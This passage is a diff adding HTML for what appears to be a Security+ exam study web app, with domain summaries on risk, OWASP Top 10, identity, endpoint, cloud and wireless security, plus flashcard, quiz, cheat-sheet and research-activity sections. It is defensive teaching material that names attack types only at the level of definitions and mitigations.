+        <li><strong>Containment:</strong> Limit scope (short-term: isolate; long-term: patch)</li>
+        <li><strong>Eradication:</strong> Remove malware, close vulnerabilities</li>
+        <li><strong>Recovery:</strong> Restore systems, validate functionality</li>
+        <li><strong>Lessons Learned:</strong> Post-incident review, update policies and procedures</li>
+      </ol>
+      <h4>Digital Forensics</h4>
+      <ul>
+        <li><strong>Order of Volatility:</strong> CPU registers/cache → RAM → Swap/page file → Hard drive → Remote logs → Backups. Collect most volatile first</li>
+        <li><strong>Chain of custody:</strong> Document who handled evidence and when. Required for legal proceedings</li>
+        <li><strong>Legal hold:</strong> Suspend normal data deletion when litigation is anticipated</li>
+      </ul>
+    </div>
+  </div>
+
+  <div class="domain-card">
+    <div class="domain-header" onclick="toggleDomain(this)">
+      <h3>📋 5.0 — Security Program Management &amp; Oversight <span class="domain-pct">20%</span></h3>
+      <span class="chevron">▼</span>
+    </div>
+    <div class="domain-body">
+      <h4>Risk Management</h4>
+      <ul>
+        <li><strong>Risk = Threat × Vulnerability × Impact</strong></li>
+        <li><strong>Risk responses:</strong> Accept (tolerate), Avoid (eliminate activity), Transfer (insurance, outsource), Mitigate (reduce likelihood/impact)</li>
+        <li><strong>Quantitative risk:</strong> Dollar values. ALE = SLE × ARO (Annual Loss Expectancy = Single Loss Expectancy × Annual Rate of Occurrence)</li>
+        <li><strong>Qualitative risk:</strong> Subjective ratings (high/medium/low)</li>
+        <li><strong>BIA:</strong> Business Impact Analysis — identifies critical processes and recovery priorities</li>
+        <li><strong>RTO:</strong> Recovery Time Objective — maximum acceptable downtime</li>
+        <li><strong>RPO:</strong> Recovery Point Objective — maximum acceptable data loss (time)</li>
+      </ul>
+      <h4>Frameworks &amp; Compliance</h4>
+      <div class="table-wrap"><table>
+        <tr><th>Framework</th><th>Type</th><th>Purpose</th></tr>
+        <tr><td><strong>NIST CSF</strong></td><td>Voluntary</td><td>Identify, Protect, Detect, Respond, Recover</td></tr>
+        <tr><td><strong>ISO 27001</strong></td><td>Certifiable</td><td>ISMS (Information Security Management System)</td></tr>
+        <tr><td><strong>PCI-DSS</strong></td><td>Mandatory</td><td>Payment card data security</td></tr>
+        <tr><td><strong>HIPAA</strong></td><td>Mandatory (US)</td><td>Healthcare data privacy</td></tr>
+        <tr><td><strong>GDPR</strong></td><td>Mandatory (EU)</td><td>EU personal data protection</td></tr>
+        <tr><td><strong>SOC 2</strong></td><td>Audit report</td><td>Service organization security controls</td></tr>
+      </table></div>
+      <h4>Security Policies</h4>
+      <ul>
+        <li><strong>AUP:</strong> Acceptable Use Policy — defines permitted use of company systems</li>
+        <li><strong>NDA:</strong> Non-Disclosure Agreement — protects sensitive information shared with third parties</li>
+        <li><strong>MOU/MOA:</strong> Memorandum of Understanding/Agreement — informal interorganizational agreement</li>
+        <li><strong>SLA:</strong> Service Level Agreement — defines performance and availability guarantees</li>
+        <li><strong>Data retention policy:</strong> How long data is kept and how it's disposed (secure shredding, degaussing, crypto shredding)</li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+  <div class="domain-card">
+    <div class="domain-header" onclick="toggleDomain(this)">
+      <h3>🌐 Application Security &amp; OWASP Top 10</h3>
+      <span class="chevron">▼</span>
+    </div>
+    <div class="domain-body">
+      <h4>OWASP Top 10 (Current)</h4>
+      <div class="table-wrap"><table>
+        <tr><th>#</th><th>Vulnerability</th><th>Description &amp; Mitigation</th></tr>
+        <tr><td><strong>A01</strong></td><td>Broken Access Control</td><td>Users access resources beyond their permissions. Mitigation: enforce least privilege, server-side authorization checks.</td></tr>
+        <tr><td><strong>A02</strong></td><td>Cryptographic Failures</td><td>Sensitive data exposed due to weak/absent encryption. Mitigation: TLS everywhere, strong algorithms, no hardcoded keys.</td></tr>
+        <tr><td><strong>A03</strong></td><td>Injection (SQL, OS, LDAP)</td><td>Untrusted data sent to interpreter. Mitigation: parameterized queries, input validation, ORMs.</td></tr>
+        <tr><td><strong>A04</strong></td><td>Insecure Design</td><td>Missing security controls in architecture. Mitigation: threat modeling, secure design patterns, security requirements.</td></tr>
+        <tr><td><strong>A05</strong></td><td>Security Misconfiguration</td><td>Default credentials, open cloud storage, verbose errors. Mitigation: hardening guides, disable defaults, automated config scanning.</td></tr>
+        <tr><td><strong>A06</strong></td><td>Vulnerable &amp; Outdated Components</td><td>Using libraries with known CVEs. Mitigation: SCA tools, patch management, SBOM.</td></tr>
+        <tr><td><strong>A07</strong></td><td>Identification &amp; Authentication Failures</td><td>Weak passwords, credential stuffing, broken session management. Mitigation: MFA, rate limiting, strong session IDs.</td></tr>
+        <tr><td><strong>A08</strong></td><td>Software &amp; Data Integrity Failures</td><td>Unsigned updates, insecure deserialization. Mitigation: code signing, SRI, verify integrity of updates.</td></tr>
+        <tr><td><strong>A09</strong></td><td>Security Logging &amp; Monitoring Failures</td><td>Attacks not detected due to poor logging. Mitigation: SIEM, log all auth events, alerting, retention policy.</td></tr>
+        <tr><td><strong>A10</strong></td><td>Server-Side Request Forgery (SSRF)</td><td>Server makes requests to attacker-controlled destinations. Mitigation: allowlist outbound destinations, validate URLs.</td></tr>
+      </table></div>
+      <h4>Secure Coding Practices</h4>
+      <ul>
+        <li><strong>Input validation:</strong> Validate all user input on the server side. Never trust client-side validation alone.</li>
+        <li><strong>Parameterized queries:</strong> Use prepared statements — never concatenate user input into SQL queries.</li>
+        <li><strong>Output encoding:</strong> Encode output before rendering in HTML to prevent XSS.</li>
+        <li><strong>CSRF tokens:</strong> Unique, session-bound tokens in forms — server verifies they match before processing.</li>
+        <li><strong>Error handling:</strong> Never expose stack traces or internal details to end users. Log internally.</li>
+        <li><strong>Code signing:</strong> Digitally sign executables and scripts — ensures they haven't been tampered with.</li>
+        <li><strong>SBOM (Software Bill of Materials):</strong> Inventory of all software components and their versions — enables rapid response to new CVEs.</li>
+        <li><strong>Static Application Security Testing (SAST):</strong> Analyzes source code for vulnerabilities before execution.</li>
+        <li><strong>Dynamic Application Security Testing (DAST):</strong> Tests running application for vulnerabilities (fuzzing, automated scanning).</li>
+      </ul>
+    </div>
+  </div>
+
+  <div class="domain-card">
+    <div class="domain-header" onclick="toggleDomain(this)">
+      <h3>🔑 Identity &amp; Access Management Deep Dive</h3>
+      <span class="chevron">▼</span>
+    </div>
+    <div class="domain-body">
+      <h4>Authentication Protocols</h4>
+      <div class="table-wrap"><table>
+        <tr><th>Protocol</th><th>Type</th><th>Port</th><th>Key Facts</th></tr>
+        <tr><td><strong>Kerberos</strong></td><td>Ticket-based</td><td>88</td><td>Used in AD. KDC issues TGT, then service tickets. Requires time sync ≤5 min. SSO capable.</td></tr>
+        <tr><td><strong>NTLM</strong></td><td>Challenge-response</td><td>N/A</td><td>Legacy Windows auth. Weaker than Kerberos. Vulnerable to Pass-the-Hash and relay attacks.</td></tr>
+        <tr><td><strong>RADIUS</strong></td><td>AAA</td><td>1812/1813</td><td>Centralized auth for VPN, 802.1X. Encrypts only password in Access-Request. UDP-based.</td></tr>
+        <tr><td><strong>TACACS+</strong></td><td>AAA</td><td>49</td><td>Cisco proprietary. Encrypts entire payload. Separates Authentication/Authorization/Accounting. TCP.</td></tr>
+        <tr><td><strong>LDAP</strong></td><td>Directory query</td><td>389/636</td><td>Used to look up users/groups in Active Directory. LDAPS = encrypted.</td></tr>
+      </table></div>
+      <h4>Federation &amp; SSO Protocols</h4>
+      <ul>
+        <li><strong>SAML 2.0:</strong> XML-based. Exchanges authentication assertions between Identity Provider (IdP) and Service Provider (SP). Used for enterprise SSO (e.g., login to Salesforce with your corporate AD credentials).</li>
+        <li><strong>OAuth 2.0:</strong> Authorization framework (NOT authentication). Grants third-party apps limited access to resources without sharing credentials. Example: "Allow app to access your Google Drive." Uses tokens.</li>
+        <li><strong>OpenID Connect (OIDC):</strong> Authentication layer built on top of OAuth 2.0. Adds ID tokens (JWT) containing user identity info. Used for "Sign in with Google/Microsoft/Apple."</li>
+        <li><strong>JWT (JSON Web Token):</strong> Signed (and optionally encrypted) token containing claims. Base64-encoded JSON. Three parts: Header.Payload.Signature. Signature verifies integrity and authenticity.</li>
+      </ul>
+      <h4>Privileged Access</h4>
+      <ul>
+        <li><strong>PAM (Privileged Access Management):</strong> Controls, monitors, and audits admin/root access. Features: just-in-time access, session recording, credential vaulting, approval workflows. Examples: CyberArk, BeyondTrust.</li>
+        <li><strong>JIT (Just-in-Time) Access:</strong> Grant elevated access only when needed for a specific task, for a limited time. Reduces standing privilege exposure.</li>
+        <li><strong>Break-glass accounts:</strong> Emergency admin accounts with extra scrutiny — used only for emergencies. Heavily monitored and audited.</li>
+        <li><strong>Separation of Duties:</strong> No single person should be able to complete a critical task alone. E.g., developer cannot deploy their own code to production.</li>
+        <li><strong>Mandatory Vacation / Job Rotation:</strong> Forces handoff of duties — detects fraud and hidden malicious activity.</li>
+      </ul>
+    </div>
+  </div>
+
+  <div class="domain-card">
+    <div class="domain-header" onclick="toggleDomain(this)">
+      <h3>🔒 Endpoint Security &amp; Hardening</h3>
+      <span class="chevron">▼</span>
+    </div>
+    <div class="domain-body">
+      <h4>Endpoint Hardening Techniques</h4>
+      <ul>
+        <li><strong>Patch management:</strong> Apply OS and application patches regularly. Critical/zero-day patches should be emergency-deployed.</li>
+        <li><strong>Disable unnecessary services:</strong> Reduce attack surface by stopping services not needed (Telnet, FTP, NetBIOS).</li>
+        <li><strong>Application whitelisting:</strong> Only approved applications can run. AppLocker (Windows Enterprise) enforces this. Blocks unknown malware even if AV misses it.</li>
+        <li><strong>Host-based firewall:</strong> Windows Defender Firewall / iptables. Block inbound/outbound by port, protocol, IP.</li>
+        <li><strong>Full disk encryption:</strong> BitLocker (Windows), FileVault (macOS), LUKS (Linux). Protects data if device is stolen.</li>
+        <li><strong>BIOS/UEFI password:</strong> Prevents unauthorized boot from external media.</li>
+        <li><strong>Secure Boot:</strong> UEFI feature verifying boot loader and kernel signatures. Prevents rootkits from loading before OS.</li>
+        <li><strong>TPM (Trusted Platform Module):</strong> Hardware chip that stores keys, measurements. Required for BitLocker and Windows 11.</li>
+        <li><strong>Baseline configuration:</strong> Standard hardened configuration applied to all systems. Deviations flagged by compliance tools.</li>
+        <li><strong>CIS Benchmarks:</strong> Center for Internet Security best-practice configuration guides for OS, applications, and cloud. Industry standard for hardening.</li>
+      </ul>
+      <h4>EDR vs Traditional AV</h4>
+      <ul>
+        <li><strong>Traditional AV:</strong> Signature-based — identifies known malware by comparing file hashes/patterns. Blind to novel/zero-day attacks and fileless malware.</li>
+        <li><strong>EDR:</strong> Monitors endpoint behavior continuously. Detects anomalies (unusual process spawning, lateral movement, memory injection). Can respond: isolate endpoint, kill process, roll back changes.</li>
+        <li><strong>XDR:</strong> Extends EDR across network, email, cloud. Correlates telemetry from multiple sources for better detection and investigation.</li>
+        <li><strong>MDR:</strong> Managed Detection and Response — outsourced SOC team monitoring EDR/XDR on your behalf.</li>
+      </ul>
+      <h4>Mobile Device Security</h4>
+      <ul>
+        <li><strong>MDM vs MAM:</strong> MDM manages the entire device. MAM (Mobile Application Management) manages only corporate apps — better for BYOD.</li>
+        <li><strong>Containerization:</strong> Isolates corporate data/apps in encrypted container on personal device. Corporate data can be wiped without touching personal data.</li>
+        <li><strong>Jailbreaking / Rooting:</strong> Removes OS security restrictions. MDM can detect and block jailbroken devices from accessing corporate resources.</li>
+        <li><strong>Certificate-based authentication:</strong> Deploy certificates to mobile devices for Wi-Fi/VPN auth instead of passwords — more secure, no credential theft risk.</li>
+      </ul>
+    </div>
+  </div>
+
+  <div class="domain-card">
+    <div class="domain-header" onclick="toggleDomain(this)">
+      <h3>☁️ Cloud Security Deep Dive</h3>
+      <span class="chevron">▼</span>
+    </div>
+    <div class="domain-body">
+      <h4>Shared Responsibility Model</h4>
+      <div class="table-wrap"><table>
+        <tr><th>Responsibility</th><th>IaaS</th><th>PaaS</th><th>SaaS</th></tr>
+        <tr><td>Physical infrastructure</td><td>Provider</td><td>Provider</td><td>Provider</td></tr>
+        <tr><td>Hypervisor / OS</td><td>Provider (hyp) / Customer (OS)</td><td>Provider</td><td>Provider</td></tr>
+        <tr><td>Runtime / Middleware</td><td>Customer</td><td>Provider</td><td>Provider</td></tr>
+        <tr><td>Application code</td><td>Customer</td><td>Customer</td><td>Provider</td></tr>
+        <tr><td>Data</td><td>Customer</td><td>Customer</td><td>Customer</td></tr>
+        <tr><td>Identity &amp; access</td><td>Customer</td><td>Customer</td><td>Customer</td></tr>
+      </table></div>
+      <h4>Cloud Security Controls</h4>
+      <ul>
+        <li><strong>CASB (Cloud Access Security Broker):</strong> Sits between users and cloud services. Enforces policies: DLP, access control, threat protection, compliance. Provides visibility into shadow IT (unauthorized cloud apps).</li>
+        <li><strong>CSPM (Cloud Security Posture Management):</strong> Continuously scans cloud environment for misconfigurations (public S3 buckets, overly permissive IAM roles, unencrypted databases). Auto-remediation available.</li>
+        <li><strong>CIEM (Cloud Infrastructure Entitlement Management):</strong> Manages and right-sizes cloud IAM permissions. Identifies excessive permissions and enforces least privilege in cloud.</li>
+        <li><strong>Cloud security groups:</strong> Virtual firewall applied to cloud instances (stateful). Controls inbound/outbound traffic at instance level.</li>
+        <li><strong>NACLs (Network ACLs):</strong> Subnet-level stateless firewall in cloud VPCs. Applied before security groups.</li>
+        <li><strong>Key Management Service (KMS):</strong> Managed service for creating, rotating, and controlling encryption keys. Separates key management from data storage — keys can be customer-managed (BYOK).</li>
+      </ul>
+      <h4>Cloud Threats</h4>
+      <ul>
+        <li><strong>Misconfigured storage:</strong> Public S3 buckets, Azure Blob containers — most common source of cloud data breaches. Always check bucket ACLs/policies.</li>
+        <li><strong>Overprivileged IAM:</strong> Service accounts or users with excessive permissions. Apply least privilege; audit IAM quarterly.</li>
+        <li><strong>Insecure APIs:</strong> Cloud resources exposed via APIs without proper auth. Enforce API keys, OAuth, rate limiting.</li>
+        <li><strong>Side-channel attacks:</strong> Shared compute resources (VMs on same host) — theoretical risk of data leakage between VMs via CPU cache timing attacks.</li>
+      </ul>
+    </div>
+  </div>
+
+  <div class="domain-card">
+    <div class="domain-header" onclick="toggleDomain(this)">
+      <h3>📡 Wireless &amp; Network Security Controls</h3>
+      <span class="chevron">▼</span>
+    </div>
+    <div class="domain-body">
+      <h4>Wireless Security Protocols Comparison</h4>
+      <div class="table-wrap"><table>
+        <tr><th>Protocol</th><th>Encryption</th><th>Auth</th><th>Status</th></tr>
+        <tr><td><strong>WEP</strong></td><td>RC4 (broken)</td><td>Shared key</td><td>DEPRECATED — cracked in minutes</td></tr>
+        <tr><td><strong>WPA</strong></td><td>TKIP</td><td>PSK or Enterprise</td><td>DEPRECATED — vulnerable to TKIP attacks</td></tr>
+        <tr><td><strong>WPA2-Personal</strong></td><td>CCMP/AES-128</td><td>PSK</td><td>Still widely used, vulnerable to offline dictionary attacks on PSK</td></tr>
+        <tr><td><strong>WPA2-Enterprise</strong></td><td>CCMP/AES-128</td><td>802.1X/RADIUS</td><td>Secure — per-user auth, no shared password</td></tr>
+        <tr><td><strong>WPA3-Personal</strong></td><td>CCMP/AES-128</td><td>SAE (Dragonfly)</td><td>Current standard — immune to offline attacks</td></tr>
+        <tr><td><strong>WPA3-Enterprise</strong></td><td>GCMP/AES-256</td><td>802.1X/RADIUS</td><td>Highest security — 192-bit mode available</td></tr>
+      </table></div>
+      <h4>Network Security Zones</h4>
+      <ul>
+        <li><strong>Intranet:</strong> Internal corporate network — trusted zone</li>
+        <li><strong>Extranet:</strong> Network extended to trusted third parties (partners, suppliers) via VPN or dedicated link</li>
+        <li><strong>DMZ:</strong> Semi-trusted — public-facing servers. Two firewalls required for true DMZ</li>
+        <li><strong>Guest network:</strong> Isolated network for visitors. No access to internal resources. Implemented via separate VLAN + firewall rules</li>
+        <li><strong>Out-of-band management:</strong> Separate dedicated network/interface for managing devices. Isolates management traffic from production</li>
+      </ul>
+      <h4>Data Loss Prevention (DLP)</h4>
+      <ul>
+        <li><strong>Network DLP:</strong> Inspects network traffic for sensitive data patterns (SSNs, credit cards, keywords). Can block or quarantine</li>
+        <li><strong>Endpoint DLP:</strong> Agent on device monitors file access, USB transfers, clipboard, email attachments</li>
+        <li><strong>Cloud DLP:</strong> Scans cloud storage (OneDrive, Google Drive) for sensitive data violations</li>
+        <li><strong>Data classification + labeling:</strong> Tag data (Public, Internal, Confidential, Restricted) and apply DLP policies per classification</li>
+      </ul>
+    </div>
+  </div>
+
+<!-- FLASHCARDS -->
+<div id="panel-flashcards" class="tab-panel">
+  <div class="fc-controls">
+    <select class="category-select" id="fc-category" onchange="loadCards()">
+      <option value="all">All Categories</option>
+      <option value="crypto">Cryptography</option>
+      <option value="threats">Threats &amp; Attacks</option>
+      <option value="ops">Security Operations</option>
+      <option value="governance">Governance &amp; Risk</option>
+    </select>
+    <div class="fc-progress" id="fc-progress">Card 1 of 20</div>
+  </div>
+  <div class="flashcard-scene" onclick="flipCard()">
+    <div class="flashcard" id="flashcard">
+      <div class="fc-face fc-front"><div class="fc-label">Term</div><div class="fc-term" id="fc-term">Loading...</div><div class="fc-hint">Click to reveal definition</div></div>
+      <div class="fc-face fc-back"><div class="fc-label">Definition</div><div class="fc-definition" id="fc-def"></div></div>
+    </div>
+  </div>
+  <div class="fc-nav">
+    <button class="fc-unknown-btn" onclick="markCard(false)">✗ Still Learning</button>
+    <button class="fc-btn" onclick="prevCard()">← Prev</button>
+    <span class="fc-count" id="fc-count">1 / 20</span>
+    <button class="fc-btn" onclick="nextCard()">Next →</button>
+    <button class="fc-known-btn" onclick="markCard(true)">✓ Got It</button>
+  </div>
+  <div class="fc-score">Known: <span id="fc-known-count">0</span> / <span id="fc-total-count">20</span></div>
+</div>
+
+<!-- QUIZ -->
+<div id="panel-quiz" class="tab-panel">
+  <div id="quiz-container">
+    <div style="margin-bottom:28px;">
+      <h2 style="font-size:1.2rem;font-weight:700;margin-bottom:6px;">Security+ Practice Quiz</h2>
+      <p style="color:var(--text-muted);font-size:0.88rem;">20 questions · All SY0-701 domains · Immediate feedback</p>
+      <div class="quiz-progress-bar"><div class="quiz-progress-fill" id="quiz-progress" style="width:0%"></div></div>
+      <div style="font-size:0.82rem;color:var(--text-muted);">Question <span id="q-current">1</span> of <span id="q-total">20</span></div>
+    </div>
+    <div id="question-area"></div>
+  </div>
+  <div id="quiz-result" class="quiz-result" style="display:none;"></div>
+</div>
+
+<!-- CHEAT SHEET -->
+<div id="panel-cheatsheet" class="tab-panel">
+  <h2 style="margin-bottom:6px;font-size:1.1rem;">Security+ Quick Reference</h2>
+  <p style="color:var(--text-muted);font-size:0.88rem;margin-bottom:24px;">Key terms, formulas, and frameworks for last-minute review</p>
+  <div class="cheat-grid">
+    <div class="cheat-card">
+      <h3>🔐 Cryptography Algorithms</h3>
+      <div class="cheat-row"><span class="cheat-key">AES</span><span class="cheat-val">Symmetric, 128/256-bit</span></div>
+      <div class="cheat-row"><span class="cheat-key">3DES</span><span class="cheat-val">Legacy symmetric (avoid)</span></div>
+      <div class="cheat-row"><span class="cheat-key">RSA</span><span class="cheat-val">Asymmetric, 2048+ bit</span></div>
+      <div class="cheat-row"><span class="cheat-key">ECC</span><span class="cheat-val">Asymmetric, smaller keys</span></div>
+      <div class="cheat-row"><span class="cheat-key">SHA-256</span><span class="cheat-val">Hashing, 256-bit digest</span></div>
+      <div class="cheat-row"><span class="cheat-key">MD5</span><span class="cheat-val">128-bit, broken/avoid</span></div>
+      <div class="cheat-row"><span class="cheat-key">Diffie-Hellman</span><span class="cheat-val">Key exchange protocol</span></div>
+    </div>
+    <div class="cheat-card">
+      <h3>⚠️ Attack Types</h3>
+      <div class="cheat-row"><span class="cheat-key">SQL Injection</span><span class="cheat-val">Malicious DB queries</span></div>
+      <div class="cheat-row"><span class="cheat-key">XSS</span><span class="cheat-val">Injected browser scripts</span></div>
+      <div class="cheat-row"><span class="cheat-key">CSRF</span><span class="cheat-val">Forged cross-site requests</span></div>
+      <div class="cheat-row"><span class="cheat-key">Buffer Overflow</span><span class="cheat-val">Memory boundary exploit</span></div>
+      <div class="cheat-row"><span class="cheat-key">Pass the Hash</span><span class="cheat-val">Use hash without cracking</span></div>
+      <div class="cheat-row"><span class="cheat-key">Zero-day</span><span class="cheat-val">Unpatched vulnerability</span></div>
+      <div class="cheat-row"><span class="cheat-key">APT</span><span class="cheat-val">Persistent nation-state attack</span></div>
+    </div>
+    <div class="cheat-card">
+      <h3>📊 Risk Formulas</h3>
+      <div class="cheat-row"><span class="cheat-key">ALE</span><span class="cheat-val">SLE × ARO</span></div>
+      <div class="cheat-row"><span class="cheat-key">SLE</span><span class="cheat-val">Asset Value × EF</span></div>
+      <div class="cheat-row"><span class="cheat-key">Risk Accept</span><span class="cheat-val">Tolerate the risk</span></div>
+      <div class="cheat-row"><span class="cheat-key">Risk Avoid</span><span class="cheat-val">Eliminate the activity</span></div>
+      <div class="cheat-row"><span class="cheat-key">Risk Transfer</span><span class="cheat-val">Insurance / outsource</span></div>
+      <div class="cheat-row"><span class="cheat-key">Risk Mitigate</span><span class="cheat-val">Reduce impact/likelihood</span></div>
+      <div class="cheat-row"><span class="cheat-key">RTO / RPO</span><span class="cheat-val">Recovery time / data loss</span></div>
+    </div>
+    <div class="cheat-card">
+      <h3>🔧 Security Tools</h3>
+      <div class="cheat-row"><span class="cheat-key">SIEM</span><span class="cheat-val">Log aggregation + alerting</span></div>
+      <div class="cheat-row"><span class="cheat-key">SOAR</span><span class="cheat-val">Automated IR workflows</span></div>
+      <div class="cheat-row"><span class="cheat-key">EDR</span><span class="cheat-val">Endpoint detect + respond</span></div>
+      <div class="cheat-row"><span class="cheat-key">XDR</span><span class="cheat-val">Cross-domain EDR</span></div>
+      <div class="cheat-row"><span class="cheat-key">DLP</span><span class="cheat-val">Prevent data exfiltration</span></div>
+      <div class="cheat-row"><span class="cheat-key">CASB</span><span class="cheat-val">Cloud access control</span></div>
+      <div class="cheat-row"><span class="cheat-key">PAM</span><span class="cheat-val">Privileged access mgmt</span></div>
+    </div>
+    <div class="cheat-card">
+      <h3>📋 Compliance Frameworks</h3>
+      <div class="cheat-row"><span class="cheat-key">NIST CSF</span><span class="cheat-val">Identify/Protect/Detect/Respond/Recover</span></div>
+      <div class="cheat-row"><span class="cheat-key">ISO 27001</span><span class="cheat-val">ISMS standard, certifiable</span></div>
+      <div class="cheat-row"><span class="cheat-key">PCI-DSS</span><span class="cheat-val">Payment card data</span></div>
+      <div class="cheat-row"><span class="cheat-key">HIPAA</span><span class="cheat-val">US healthcare privacy</span></div>
+      <div class="cheat-row"><span class="cheat-key">GDPR</span><span class="cheat-val">EU personal data</span></div>
+      <div class="cheat-row"><span class="cheat-key">SOC 2</span><span class="cheat-val">Service org audit</span></div>
+    </div>
+    <div class="cheat-card">
+      <h3>🚨 Incident Response Steps</h3>
+      <div class="cheat-row"><span class="cheat-key">1. Preparation</span><span class="cheat-val">IR plan + tools ready</span></div>
+      <div class="cheat-row"><span class="cheat-key">2. Identification</span><span class="cheat-val">Detect, analyze incident</span></div>
+      <div class="cheat-row"><span class="cheat-key">3. Containment</span><span class="cheat-val">Isolate + limit damage</span></div>
+      <div class="cheat-row"><span class="cheat-key">4. Eradication</span><span class="cheat-val">Remove threat</span></div>
+      <div class="cheat-row"><span class="cheat-key">5. Recovery</span><span class="cheat-val">Restore &amp; verify</span></div>
+      <div class="cheat-row"><span class="cheat-key">6. Lessons Learned</span><span class="cheat-val">Document &amp; improve</span></div>
+    </div>
+  </div>
+</div>
+
+<!-- ACTIVITIES -->
+<div id="panel-activities" class="tab-panel">
+  <h2 style="margin-bottom:6px;font-size:1.1rem;">Reading &amp; Research Activities</h2>
+  <p style="color:var(--text-muted);font-size:0.88rem;margin-bottom:24px;">Apply security concepts through guided analysis and real-world research</p>
+
+  <div class="activity-card">
+    <div class="act-type">📖 Reading Comprehension</div>
+    <h3>Activity 1: Analyzing a Security Breach</h3>
+    <p>Read the following scenario, which represents a composite of real-world security incidents. Apply the frameworks and concepts from the Security+ study guide to analyze it.</p>
+    <div class="reading-prompt">
+      A mid-size financial firm discovers that an attacker has had access to their internal network for approximately 8 months. Initial entry was through a phishing email sent to a finance employee. The attacker used the employee's credentials to access a VPN, then escalated privileges using a known but unpatched vulnerability (CVE-2023-XXXX). Over months, they exfiltrated client financial data to an external server. The breach was discovered when a SIEM alert flagged unusual data transfer volumes at 3 AM.
+    </div>
+    <ol>
+      <li>What type of threat actor is most likely responsible? Justify your classification based on the characteristics described.</li>
+      <li>Identify at least 5 security control failures present in this scenario. For each, name a specific control that would have prevented or detected it earlier.</li>
+      <li>Using the incident response lifecycle (Preparation → Lessons Learned), describe the actions the security team should take at each phase once the breach is confirmed.</li>
+      <li>What compliance regulations might this company be subject to, and what are the notification obligations following this breach?</li>
+      <li>Research "dwell time" in cybersecurity. What is the current industry average? Why does longer dwell time increase breach severity?</li>
+    </ol>
+    <div style="margin-top:14px;"><h4 style="font-size:0.8rem;font-weight:700;color:var(--accent2);margin-bottom:8px;">Suggested Resources</h4>
+      <span class="resource-link">🔗 IBM Cost of a Data Breach Report (annual) — IBM Security</span>
+      <span class="resource-link">🔗 Verizon DBIR (Data Breach Investigations Report) — verizon.com/dbir</span>
+    </div>
+  </div>
+
+  <div class="activity-card">
+    <div class="act-type">🔬 Research Activity</div>
+    <h3>Activity 2: Cryptography in the Real World</h3>
+    <p>Cryptography underpins all of modern security. This activity bridges textbook knowledge to practical application.</p>
+    <ol>
+      <li>Research how TLS 1.3 works step by step. Draw or describe the TLS handshake process. How does it use both asymmetric (for key exchange) and symmetric (for bulk data) cryptography?</li>
+      <li>Research certificate pinning. What is it, what problem does it solve, and what are the downsides?</li>
+      <li>Look up "quantum cryptography" and "post-quantum cryptography." Why are current asymmetric algorithms like RSA potentially vulnerable to quantum computers? What algorithms is NIST standardizing as quantum-resistant?</li>
+      <li>Research a real-world case where a widely-used cryptographic algorithm was found to be weak (e.g., MD5, SHA-1, DES, RC4). What was the vulnerability, and how was the transition to stronger algorithms handled?</li>
+      <li>Install a browser extension or use your browser's developer tools to inspect the TLS certificate of three different websites. Record: issuing CA, certificate expiration date, key algorithm and length, and whether certificate transparency is enabled.</li>
+    </ol>
+  </div>
+
+  <div class="activity-card">
+    <div class="act-type">📖 Reading Comprehension</div>
+    <h3>Activity 3: Zero Trust Architecture</h3>
+    <p>Zero Trust is a critical modern security architecture concept heavily featured on SY0-701. Read the following description and answer the comprehension questions.</p>
+    <div class="reading-prompt">
+      Zero Trust (ZT) is a security model built on the principle of "never trust, always verify." Traditional perimeter security assumed that anything inside the network was trustworthy. Zero Trust eliminates this assumption — every user, device, and application must authenticate and be authorized before accessing any resource, regardless of whether they're inside or outside the corporate network. Core pillars include: strong identity verification (MFA), device health validation, least-privilege access, microsegmentation, and continuous monitoring with analytics.
+    </div>
+    <ol>
+      <li>Explain the "implicit trust" problem with traditional perimeter security. Give a scenario (e.g., insider threat or compromised VPN) where perimeter security fails.</li>
+      <li>Research NIST SP 800-207 (Zero Trust Architecture). Summarize the three core components: policy engine, policy administrator, and policy enforcement point.</li>
+      <li>What role does microsegmentation play in Zero Trust? How does it limit the impact of a successful breach?</li>
+      <li>Compare Zero Trust to a traditional VPN-based remote access model. What are the advantages and disadvantages of each from a security and user experience perspective?</li>
+      <li>Research Software-Defined Perimeter (SDP). How does it implement Zero Trust principles?</li>
+    </ol>
+  </div>
+
+  <div class="activity-card">
+    <div class="act-type">🔬 Research Activity</div>
+    <h3>Activity 4: Risk Management &amp; Business Continuity</h3>
+    <p>Risk management connects security decisions to business outcomes. This activity develops your ability to apply risk frameworks quantitatively and qualitatively.</p>
+    <ol>
+      <li>A company has an asset worth $500,000. A fire could destroy it with an exposure factor of 40%. Fires occur on average once every 10 years. Calculate SLE, ARO, and ALE. Would you recommend purchasing a $15,000/year fire suppression upgrade that would reduce EF to 10%?</li>
+      <li>Research the difference between RTO, RPO, MTTR (Mean Time to Repair), and MTBF (Mean Time Between Failures). Create a table with definitions and which teams are responsible for each metric.</li>
+      <li>Research a real-world disaster recovery scenario (find a case study or news article). What was the incident, what was the impact in downtime, and what could have been done differently?</li>
+      <li>Look up the NIST Cybersecurity Framework (CSF) 2.0. What new function was added in the 2024 update? Summarize the purpose of all 6 functions.</li>
+      <li>Research "supply chain risk" in cybersecurity. What happened in the SolarWinds attack of 2020, and why is it used as a benchmark example of supply chain risk?</li>
+    </ol>
+    <div style="margin-top:14px;"><h4 style="font-size:0.8rem;font-weight:700;color:var(--accent2);margin-bottom:8px;">Suggested Resources</h4>
+      <span class="resource-link">🔗 nist.gov/cyberframework — NIST CSF documentation</span>
+      <span class="resource-link">🔗 cisecurity.org — CIS Controls</span>
+      <span class="resource-link">🔗 Professor Messer Security+ SY0-701 — professorMesser.com</span>
+    </div>
+  </div>
+
+<!-- ===== CONCEPTS & VISUALS ===== -->
+<div id="panel-concepts" class="tab-panel">
+
+  <!-- CIA TRIAD -->
+  <div class="concepts-section">
+    <h2>🔐 The CIA Triad — Core Security Principles</h2>
+    <p>Every security control, policy, and threat maps back to one or more of the three pillars: Confidentiality, Integrity, and Availability. Understanding which pillar is at risk in a scenario is key to answering Security+ questions.</p>
+    <div class="infographic-wrap">
+      <svg viewBox="0 0 700 320" xmlns="http://www.w3.org/2000/svg" style="width:100%;max-width:700px">
+        <!-- Background triangle -->
+        <polygon points="350,30 80,280 620,280" fill="none" stroke="#3d4270" stroke-width="2"/>
+        <!-- C circle -->
+        <circle cx="350" cy="60" r="70" fill="#1a1d2e" stroke="#9b59b6" stroke-width="2.5"/>
+        <text x="350" y="50" text-anchor="middle" fill="#9b59b6" font-size="22" font-weight="800" font-family="sans-serif">C</text>
+        <text x="350" y="70" text-anchor="middle" fill="white" font-size="11" font-weight="700" font-family="sans-serif">Confidentiality</text>
